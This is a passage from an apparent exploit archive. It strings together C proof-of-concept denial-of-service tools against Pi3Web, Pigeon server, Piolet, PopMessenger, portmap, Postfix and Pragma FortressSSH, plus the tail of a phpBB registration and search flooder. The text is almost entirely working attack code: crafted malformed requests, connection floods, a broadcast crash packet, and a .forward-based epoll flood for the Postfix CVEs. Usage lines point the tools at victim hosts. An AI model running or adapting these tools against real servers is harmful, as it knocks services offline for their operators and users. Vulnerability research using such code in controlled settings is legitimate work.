                 "Accept: */*\r\n"
                 "Accept-Language: en-us\r\n"
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                 "Accept encoding: gzip,deflate\r\n"
                 "Keep-Alive: 300\r\n"
                 "Proxy-Connection: keep-alive\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Cache-Control: no-cache\r\n"
                 "Pragma: no-cache\r\n";
    char *Profile = "%40neosecurityteam.net&new_password=0123456&password_confirm=0123456&icq=&aim=&msn=&yim=&website=&location=&occupation=&interests=&signature=&viewemail=0&hideonline=0&notifyreply=0&notifypm=1&popup_pm=1&attachsig=1&allowbbcode=1&allowhtml=0&allowsmilies=1&language=english&style=1&timezone=0&dateformat=D+M+d%2C+Y+g%3Ai+a&mode=register&agreed=true&coppa=0&submit=Submit\r\n";
    char *Search  = "&search_terms=any&search_author=*&search_forum=-1&search_time=0&search_fields=all&search_cat=-1&sort_by=0&sort_dir=DESC&show_results=topics&return_chars=200\r\n";

    if(strcmp("profile.php", Pro_Sea) == 0) sprintf(str1, "username=NsT__%d&email=NsT__%d%s", x, x, Profile);
    else if(strcmp("search.php", Pro_Sea) == 0)
    {
               Pro_Sea = "search.php?mode=results";
               sprintf(str1, "search_keywords=Hack%d%s", x, Search);
    }
    else
    {
               puts("Sorry. Try making the right choice");
               exit(-1);
    }

    sprintf(str2, "POST %s%s HTTP/1.1\r\n"
                  "Host: %s\r\n"
                  "Referer: http://%s/\r\n%s"
                  "Content-Length: %d\r\n\r\n%s", Path, Pro_Sea, Host, Host, req0, strlen(str1), str1);
          
    write(sock, str2, strlen(str2));
    write(1, ".", 1);
    fflush(stdout);
}

char Use(char *program)
{
	fprintf(stderr,"[*] Use: %s <path> <search.php or profile.php> <Host>\n", program);
	fprintf(stderr,"[*] Example: %s /phpBB/ profile.php Victimshost.com\n", program);
	fflush(stdout);
	exit(-1);
}

/*

@@@@'''@@@@'@@@@@@@@@'@@@@@@@@@@@
'@@@@@''@@'@@@''''''''@@''@@@''@@
'@@'@@@@@@''@@@@@@@@@'''''@@@
'@@'''@@@@'''''''''@@@''''@@@
@@@@''''@@'@@@@@@@@@@''''@@@@@

*/

// milw0rm.com [2005-06-22]
/* Pi3Web 2.0.1 DoS - Pr00f of concept.
*
* Vulnerable systems: Pi3Web 2.0.1 (maybe others)
* Vendor: www.johnroy.com/pi3  - http://pi3web.sourceforge.net/
* Patch: no yet.
*
* Info: Pi3Web Server is vulnerable to a denial of Service.
* when a malformed HTTP Request is done the webserver hangs 
* due to an stack overflow. GET /////////..[354]../////////
*
* Found by aT4r@3wdesign.es  04/26/2003
* Compiled with: lcc-win32 v3.3.
*
*/

#pragma comment (lib,"ws2_32")
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>

char evilbuffer[1024],evilrequest[512],ip[15];
short port=80;


int isalive(int OPT)
{
	struct sockaddr_in haxorcitos;
	int fd;

	haxorcitos.sin_port = htons(port);
	haxorcitos.sin_family = AF_INET;
	haxorcitos.sin_addr.s_addr = inet_addr(ip);

	if ((fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
	{
		printf(" [-] Unable to Create Socket\n\n");
		return(0);
	}
	if (connect(fd,( struct sockaddr *)&haxorcitos,sizeof(haxorcitos)) == -1)
	{
		if (OPT==0)
			printf(" [+] Exploit Success. Remote webserver shutdown\n");
		else
			printf(" [-] Unable to connect\n\n");
		return(0);
	}
	if (OPT==0)
	{
		printf(" [-] Exploit Failed. System Patched?\n\n");
	}
	else
	{
		send(fd,evilbuffer, strlen(evilbuffer),0);
		printf(" [+] Data Sent. Now Checking Host\n");
		closesocket(fd);

	}
return(1);
}


void usage(void)
{
	printf(" [+] Usage: PiDoS.exe HOST [port]\n\n");	exit(1);
}


void main(int argc,char *argv[])
{
	WSADATA ws;

	if	(WSAStartup( MAKEWORD(1,1), &ws )!=0)
	{
		printf(" [+] WSAStartup() error\n");
		exit(0);
	}

	printf("\n . .. ...:Pi3Web Denial of Service (aT4r@3wdesign.es) :... 
..\n\n");

	if ((argc!=2) && (argc!=3))
		usage();

	strcpy(ip,argv[1]);
	if (argc==3) port=atoi(argv[2]);

	memset(evilrequest,0,512);
	memset(evilbuffer,0,1024);
	memset(evilrequest,'/',354);
	//sprintf(evilbuffer, "GET %s\r\n",evilrequest);
	sprintf(evilbuffer,"GET %s HTTP/1.0\r\nUser-Agent: foo\r\nHost: 
%s\r\n\r\n\r\n",evilrequest,argv[2]);

	if (isalive(1))
		{ sleep(1000); isalive(0);}

}

// milw0rm.com [2003-04-29]
source: http://www.securityfocus.com/bid/7555/info

It has been reported that Pi3Web server is prone to a denial of service vulnerability. Reportedly, when a malicious GET request is sent to the Pi3Web server the server will fail. It should be noted that the Unix version has been reported vulnerable, it is not currently known if other platforms are affected.

/*
 * Unix Version of the Pi3web DoS.
 * ----------------------------------------------------------
 * Info: Pi3Web Server is vulnerable to a denial of Service.
 * ----------------------------------------------------------
 * VULNERABILITY:
 * GET //// <- 354
 *
 * The bug was found by aT4r@3wdesign.es 04/26/2003
 * www.3wdesign.es Security
 * ----------------------------------------------------------
 * Unix Version Credits.
 * AUTHOR : Angelo Rosiello
 * CONTACT: angelo@rosiello.org, angelo@dtors.net
 *
*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <assert.h>

void addr_initialize();

int main(int argc, char **argv)
{
  int i, port, sd, rc;
  char buffer[355];
  char *get = "GET";
  char packet[360];
  struct sockaddr_in server;

  if(argc > 3 || argc < 2)
  {
    printf("USAGE: %s IP PORT\n", argv[0]);
    printf("e.g. ./pi3web-DoS 127.0.0.1 80\n");
    exit(0);
  }
  if(argc == 2) port = 80;
  else port = atoi(argv[2]);

  for(i = 0; i < 355; i++) buffer[i] = '/'; //Build the malformed request
  sprintf(packet, "%s %s\n", get, buffer);
  addr_initialize(&server, port, (long)inet_addr(argv[1]));

  sd = socket(AF_INET, SOCK_STREAM, 0);
  if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0) perror("Connect");
  assert(rc == 0);
  printf("\n\t\t(c) 2003 DTORS Security\n");
  printf("\t\tUnix Version DoS for Pi3web\n");
  printf("\t\tby Angelo Rosiello\n\n");
  write(sd, packet, strlen(packet)); //Caput!
  printf("Malformed packet sent!\n");
  close(sd);

  printf("Checking if the server crashed...\n");
  sleep(3);

  sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd < 0) perror("Socket");
  assert(sd >= 0);
  rc = connect(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0)
  {
    printf("The server is dead!\n");
    exit(0);
  }
  else if(rc == 0) printf("The server is not vulnerable!\n");
  close(sd);
  exit(0);
}

void addr_initialize (struct sockaddr_in *address, int port, long IPaddr)
{
        address -> sin_family = AF_INET;
        address -> sin_port = htons((u_short)port);
        address -> sin_addr.s_addr = IPaddr;
}

/*EOF*/

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
#include <winsock.h>
#include "winerr.h"

#define close closesocket
#else
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#endif

#define VER "0.1"
#define PORT 3103
#define BUFFSZ 8192 // we need at least 8180 'a's

u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
struct sockaddr_in peer;
int sd;
u_short port = PORT;
u_char *buff;

setbuf(stdout, NULL);

fputs("\n"
"Pigeon server <= 3.02.0143 freeze "VER"\n"
"by Luigi Auriemma\n"
"e-mail: aluigi@altervista.org\n"
"web: http://aluigi.altervista.org\n"
"\n", stdout);

if(argc < 2) {
printf("\nUsage: %s <server> [port(%d)]\n"
"\n", argv[0], PORT);
exit(1);
}

#ifdef WIN32
WSADATA wsadata;
WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

if(argc > 2) port = atoi(argv[2]);

peer.sin_addr.s_addr = resolv(argv[1]);
peer.sin_port = htons(port);
peer.sin_family = AF_INET;

printf("\n- target %s:%hu\n",
inet_ntoa(peer.sin_addr), port);

sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(sd < 0) std_err();

if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
< 0) std_err();

buff = malloc(BUFFSZ);
if(!buff) std_err();
memset(buff, 'a', BUFFSZ);
buff[BUFFSZ - 5] = '|';
buff[BUFFSZ - 4] = '|';
buff[BUFFSZ - 3] = '1';
buff[BUFFSZ - 2] = '|';
buff[BUFFSZ - 1] = '|';

fputs("- send malformed data\n", stdout);
if(send(sd, buff, BUFFSZ, 0)
< 0) std_err();

close(sd);
fputs("- the server should be freezed, check it manually\n\n", stdout);
return(0);
}

u_long resolv(char *host) {
struct hostent *hp;
u_long host_ip;

host_ip = inet_addr(host);
if(host_ip == INADDR_NONE) {
hp = gethostbyname(host);
if(!hp) {
printf("\nError: Unable to resolve hostname (%s)\n", host);
exit(1);
} else host_ip = *(u_long *)(hp->h_addr);
}
return(host_ip);
}

#ifndef WIN32
void std_err(void) {
perror("\nError");
exit(1);
}
#endif

// milw0rm.com [2004-09-19]/************************************************************
*                      Piolet client v1.05 Remote Denial of Service                    *
*               Proof of Concept by Luca Ercoli  luca.ercoli[at]inwind.it             *
************************************************************/

#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

int ck,port=701,sd,cx=0,contatore=0,prec;

struct sockaddr_in pilot_client;

void ending(char *client){

int i;

pilot_client.sin_family = AF_INET;
pilot_client.sin_port = htons((u_short)port);
pilot_client.sin_addr.s_addr = (long)inet_addr(client);


for(i = 0; i < 100; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client)); 


if(ck != 0) { 

prec = 0;

if (prec == 0) contatore++;
if (prec == 1) contatore = 0;

if (contatore > 13) {
printf("! Remote client seems to be crashed.\n");
exit(0);
}

}
 
if(ck == 0) prec = 1;

  close(sd);
}

}

void kill_pilot(char *stringa){

short i;

  pilot_client.sin_family = AF_INET;
  pilot_client.sin_port = htons((u_short)port);
  pilot_client.sin_addr.s_addr = (long)inet_addr(stringa);
   
for(i = 0; i < 50; i++){

sd = socket(AF_INET, SOCK_STREAM, 0);
ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client)); 


if(ck != 0) exit(0);

close(sd);

}

}

int main(int argc, char **argv)
{

short i;

 prec = 0;

  if(argc < 2)
  { 
    printf("\nUsage: %s <client-ip>\n", argv[0]);
    exit(0);
  }
  
prec=0;

printf ("\n\n+ DoS Started...\n");
printf("+ Flooding remote client...\n");

for (i=0; i<12; i++)  if(!fork()) kill_pilot(argv[1]);

printf ("+ Ending...\n");

ending(argv[1]);
  
}

// milw0rm.com [2003-08-20]
///////////////////////// popmsgboom.c
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    8473
#define BCAST   "255.255.255.255"
#define MAX     30      // we need less then 20 packets



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                on = 1;
    u_long      randnum;
    u_short     port = PORT;
    u_char      pck[] =
                "Z........\0"
                "C@main\1"
                "@chnlMAIN\1"
                "@chnlMAIN\1"
                "\1\1\1\1\1"
                "crasher\1"
                "cmdAddString\1"
                "%\1";  // the crash happens when the program receives
                        // multiple packets containing an incorrect base64
                        // char in the message field (in fact % is illegal)


    setbuf(stdout, NULL);

    fputs("\n"
        "PopMessenger <= 1.60 (20 Sep 2004) remote crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n"
            "Note: you can also launch this tool versus broadcast IP (like "BCAST")\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port    = atoi(argv[2]);
    if(!memcmp(argv[1], BCAST, sizeof(BCAST) - 1)) {
        peer.sin_addr.s_addr = 0xffffffffL;
    } else {
        peer.sin_addr.s_addr = resolv(argv[1]);
    }
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    /* broadcast */
    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on))
     < 0) std_err();

    randnum = time(NULL);

    printf("- send %d messages with an illegal base64 char to cause the crash\n", MAX);
    for(i = 0; i < MAX; i++) {
        sprintf(pck + 1, "%08lx", randnum * i);  // must be ever different
        if(sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputc('.', stdout);
        sleep(0);
    }

    close(sd);
    fputs("\n- data sent, the application should be crashed\n\n", stdout);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/////////// winerr.h

/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// milw0rm.com [2004-09-23]/////////////////////////////////////
// portmap Set+Dump Local DoS - PoC 
////////////////////////////////////
//
// Federico L. Bossi Bonin
// fbossi[at]netcomm[dot]com[dot]ar
////////////////////////////////////

// Tested on Linux with version 5

// USE DEBUGGING MODE
/////////////////////

// (gdb) backtrace
// #0  0xffffe410 in __kernel_vsyscall ()
// #1  0xb7f21343 in write () from /lib/tls/libc.so.6
// #2  0xb7f524d5 in svcfd_create () from /lib/tls/libc.so.6
// #3  0xb7f5467a in xdrrec_create () from /lib/tls/libc.so.6
// #4  0xb7f546f4 in xdrrec_create () from /lib/tls/libc.so.6
// #5  0xb7f5350d in xdr_u_long () from /lib/tls/libc.so.6
// #6  0xb7f4f48c in xdr_pmap () from /lib/tls/libc.so.6
// #7  0xb7f54e3b in xdr_reference () from /lib/tls/libc.so.6
// #8  0xb7f4f565 in xdr_pmaplist () from /lib/tls/libc.so.6
// #9  0xb7f50025 in xdr_accepted_reply () from /lib/tls/libc.so.6
// #10 0xb7f53cc5 in xdr_union () from /lib/tls/libc.so.6
// #11 0xb7f50171 in xdr_replymsg () from /lib/tls/libc.so.6
// #12 0xb7f5266e in svcfd_create () from /lib/tls/libc.so.6
// #13 0xb7f50ddc in svc_sendreply () from /lib/tls/libc.so.6
// #14 0x0804984d in reg_service (rqstp=0xbfecab4c, xprt=0xbfec872c) at portmap.c:515
// #15 0xb7f51345 in svc_getreq_common () from /lib/tls/libc.so.6
// #16 0xb7f5111d in svc_getreq_poll () from /lib/tls/libc.so.6
// #17 0xb7f51979 in svc_run () from /lib/tls/libc.so.6
// #18 0x080492dd in main (argc=134542752, argv=0xbfecb0e0) at portmap.c:303

#include <stdio.h>
#include <rpc/rpc.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>
#include <rpc/pmap_prot.h>

int i;
int len=600;
char    myhost[256];

main(int argc, char *argv[]) {

if (argc < 2) {
printf("usage:%s <hostname>\n",argv[0]);
exit(1);
}

if (argc >2) { len=atoi(argv[2]);  }
if (len > 1024) { len=1024; }

unsigned long PROGRAM=100000;
unsigned long VERSION=2;

struct hostent *hp;
struct sockaddr_in server_addr;
int sock = RPC_ANYSOCK;
register CLIENT *client;
enum clnt_stat clnt_stat;
struct timeval timeout;
timeout.tv_sec = 40;
timeout.tv_usec = 0;


if ((hp = gethostbyname(argv[1])) == NULL) {
printf("Can't resolve %s\n",argv[1]);
exit(0);
}

gethostname(myhost,255);
bcopy(hp->h_addr, (caddr_t)&server_addr.sin_addr,hp->h_length);
server_addr.sin_family = AF_INET;
server_addr.sin_port =  0;

if ((client = clnttcp_create(&server_addr,PROGRAM,VERSION,&sock,1024,1024)) == NULL) {
clnt_pcreateerror("clnttcp_create");
exit(0);
}

client->cl_auth = authunix_create(myhost, 0, 0, 0, NULL);

char *data = (char *) malloc(1024);
memset(data,0x0,strlen(data));

char *response = (char *) malloc(1024);
memset(response,0x0,strlen(response));

for (i = 0 ; i < len ; i++) {
memcpy(data+strlen(data),"1",1);
clnt_call(client,1,(xdrproc_t) xdr_wrapstring ,(char *) &data,(xdrproc_t) xdr_wrapstring,(char *)  response,timeout);
}

clnt_call(client,4,(xdrproc_t) xdr_wrapstring ,(char *) &data,(xdrproc_t) xdr_wrapstring,(char *)  response,timeout);

clnt_destroy(client);
close(sock);
free(data);
free(response);
exit(0);
}

// milw0rm.com [2006-05-22]
source: http://www.securityfocus.com/bid/8333/info

Debian has reported two vulnerabilities in the Postfix mail transfer agent. The first vulnerability, CAN-2003-0468, can allow for an adversary to "bounce-scan" a private network. It has also been reported that this vulnerability can be exploited to use the server as a distributed denial of service tool. These attacks are reportedly possible through forcing the server to connect to an arbitrary port on an arbitrary host. 

The second vulnerability, CAN-2003-0540, is another denial of service. It can be triggered by a malformed envelope address and can cause the queue manager to lock up until the message is removed manually from the queue. It is also reportedly possible to lock the SMTP listener, also resulting in a denial of service.

/*
 postfixdos.c for 1.1.12 by r3b00t <r3b00t@tx.pl>
 ------------------------------------------------
 remote/local Postfix up to (including) 1.1.12 DoS
 discovered by lcamtuf <lcamtuf@coredump.cx>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int sock = 0;

void get_response(void);
void say(char *it);

int main(int argc, char* argv[]) {
    struct hostent *hp;
    struct sockaddr_in addr;

    printf("postfixdos.c for 1.1.12 by r3b00t <r3b00t@tx.pl>\n");

    if (argc<2) {
        printf("usage: %s <smtpserver>\n", argv[0]);
        exit(0);
    }

    hp=gethostbyname(argv[1]);

    if (!hp) {
        printf("can't resolve %s\n", argv[1]);
        exit(0);
    }

    bzero((char *)&addr, sizeof(addr));

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("can't create socket\n");
        exit(0);
    }

    bcopy(hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
    addr.sin_family=AF_INET;
    addr.sin_port=htons(25);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr))!=0) {
        printf("can't connect to %s\n", argv[1]);
        close(sock);
        exit(0);
    }

    get_response();

    say("helo host\r\n");
    say("mail from: <.!>\r\n");
    say("rcpt to: <someuser123@[127.0.0.1]>\r\n");
    /* now should be freezed */

    shutdown(sock, 2);
    close(sock);

    printf("done.\n");

    return 0;
}

void get_response(void) {
    char buff[64];
    recv(sock, buff, sizeof(buff), 0);
    if (buff[0]!='2' && buff[0]!='3') printf("%s", buff);
}

void say(char *it) {
    send(sock, it, strlen(it), 0);
    get_response();
}


/*
 * http://www.wekk.net/research/CVE-2008-4042/CVE-2008-4042-exploit.c
 * http://www.wekk.net/research/CVE-2008-3889/CVE-2008-3889-exploit.c
 *
 * Exploit for Postfix 2.4 before 2.4.9, 2.5 before 2.5.5, and 2.6 
 * before 2.6-20080902, when used with the Linux 2.6 kernel.
 *
 * CVE-2008-3889 & CVE-2008-4042
 *
 * by Albert SellarÃ¨s <whats[at]wekk[dot]net> - http://www.wekk.net
 * and Marc Morata FitÃ© <marc.morata.fite[at]gmail[dot]com> 
 * 2008-09-16
 *
 * This Proof of concept creates a pipe and adds it in the postfix's epoll 
 * file descriptor.
 * When the pipe is added, an endless loop will launch lots of events to the 
 * local and master postfix processes. 
 * This will slowdown de system a lot.
 *
 * An example of use:
 * 1- Put the content "| ~/CVE-2008-3889-exploit >> /tmp/postfix.log &" (with 
 * the double quotes) 
 * in the file ~/.forward
 *
 * 2- Put the CVE-2008-4042-exploit in your home
 * gcc CVE-2008-3889-exploit.c -o CVE-2008-3889-exploit
 *
 * 3- Send and email to the user
 *
 * You can see the output at /tmp/postfix.log
 */


#include <sys/epoll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>

#define FDOPEN 200


void add_fd(int fde, int fd) {
	printf("[*] Adding fd %d to eventpoll %d\n", fd, fde);
	static struct epoll_event ev;
	ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP|EPOLLET;
	errno =0;
	// If this is a socket fd, the load is high
	ev.data.u32 = 6;
	ev.data.u64 = 6;

	if (epoll_ctl(fde, EPOLL_CTL_ADD, fd, &ev) == 0) {
		printf(" => Fd %d added!\n", fd);
	} else {
		printf(" => Error (%d) adding fd %d\n", errno, fd);
	}
}

int main(int argc, char *argv[]) {

	int fds[2];
	char dir[32], c;
	int i, found = 0;

	pipe(fds);
	sprintf(dir, "/proc/%d/fd", getpid());
	printf("[*] Opening directory %s\n", dir);
	DIR *fd_dir = opendir(dir);
	struct dirent *de = readdir(fd_dir);

	// We are looking for the eventpoll file descriptor
	while (de != NULL) {
		char link_d[256];
		char link_f[256];
		memset(link_d, 0, 256);
		sprintf(link_f, "%s/%s", dir, de->d_name);
		readlink(link_f, link_d, 256);
		if ( strstr(link_d, "eventpoll") ) {
			found = 1;
			printf(" => %s points to %s\n", de->d_name, link_d);
			add_fd(atoi(de->d_name), fds[0]);
			// We can test with more than one triggered event at once
			for (i = 0; i<FDOPEN; i++)
				add_fd(atoi(de->d_name),dup(fds[0]));
		}
		de = readdir(fd_dir);
	}
	closedir(fd_dir);
	
	if (found == 0) {
		printf("[!] Are you sure that your postfix is vulnerable?\n");
		printf("[!] Are you launching me throw a .forward file?\n");
		exit(0);
	}
	
	printf("[*] Starting to flood the system!\n");
	fflush(stdout);
	close(0);
	close(1);
	close(2);

	// This triggers the events
	while (1) {
		write(fds[1], "A",1);
		read(fds[0],&c, 1);
	}

	return 0;
}

// milw0rm.com [2008-09-16]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        22
#define BUFFSZ      0xffff
#define BOOMSZ      0x1009



int ssh_send(int sd, u8 *buff, int len);
int str_recv(int sd, u8 *buff);
int tcp_recv(int sd, u8 *buff, int len);
int ssh_recv(int sd, u8 *buff);
int putsh(u8 *dst, u8 *str);
int putcc(u8 *data, int chr, int len);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            i;
    u16     port    = PORT;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Pragma FortressSSH <= 5.0.4.293 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf("- start connections (at least 75 needed):\n");

    for(i = 1; ; i++) {
        printf("- connection %d\n", i);
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        if(str_recv(sd, buff) < 0) {
            if(i > 1) {
                printf("- Server IS vulnerable!!! wait some seconds before continuing the test\r");
                close(sd);
                sleep(ONESEC * 5);
                continue;
            }
            goto quit;
        }
        printf("  received banner: %s\n", buff);

        #define SSHBANNER   "SSH-2.0-ssh2\r\n"
        if(send(sd, SSHBANNER, sizeof(SSHBANNER) - 1, 0) < 0) goto quit;

        p = buff;
        p += putxx(p, 5,        8);
        p += putxx(p, 20,       8);
        p += putcc(p, 0x00,     16);
        p += putxx(p, BOOMSZ,   32);    p += putcc(p, 'A', BOOMSZ); // was diffie*
        p += putsh(p, "ssh-rsa,ssh-dss");
        p += putsh(p, "aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour,cast128-cbc,3des-cbc");
        p += putsh(p, "aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour,cast128-cbc,3des-cbc");
        p += putsh(p, "hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com");
        p += putsh(p, "hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com");
        p += putsh(p, "none,zlib");
        p += putsh(p, "none,zlib");
        while((p - buff) & 15) *p++ = 0;
        p += putxx(p, 0,        32);

        if(ssh_send(sd, buff, p - buff) < 0) goto quit;
        if(ssh_recv(sd, buff) < 0) goto quit;

        close(sd);
    }
    free(buff);
    return(0);
quit:
    printf("\nError: something wrong during communication with the server\n");
    close(sd);
    free(buff);
    return(1);
}



int ssh_send(int sd, u8 *buff, int len) {
    u8      tmp[4];

    printf("  %d bytes sent\n", len);
    putxx(tmp, len, 32);
    if(send(sd, tmp,  4,   0) != 4)   return(-1);
    if(send(sd, buff, len, 0) != len) return(-1);
    return(0);
}



int str_recv(int sd, u8 *buff) {
    int     len,
            t;

    for(len = 0; len < BUFFSZ; len++) {
        if(timeout(sd, 3) < 0) return(-1);
        t = recv(sd, buff + len, 1, 0);
        if(t <= 0) return(-1);
        if(buff[len] == '\n') break;
        if(buff[len] == '\r') buff[len] = 0;
    }
    buff[len] = 0;
    return(0);
}



int tcp_recv(int sd, u8 *buff, int len) {
    int     t;
    u8      *p;

    for(p = buff; len; p += t, len -= t) {
